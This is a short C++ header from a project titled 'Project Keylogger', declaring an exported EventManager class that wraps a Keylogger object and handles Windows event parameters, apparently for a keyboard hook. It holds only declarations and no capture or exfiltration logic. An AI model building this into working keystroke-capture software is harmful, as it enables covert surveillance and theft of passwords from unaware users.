/**
 *					Project Keylogger
 */


#ifndef				_EVENTMANAGER_H
#define				_EVENTMANAGER_H

#include			<Windows.h>

#include			"Keylogger.h"

class __declspec(dllexport) 			EventManager {
public: 
    EventManager(Keylogger&);
    void handleEvent(const LPARAM, const WPARAM);
private: 
    Keylogger& _keylogger;
};

#endif //_EVENTMANAGER_H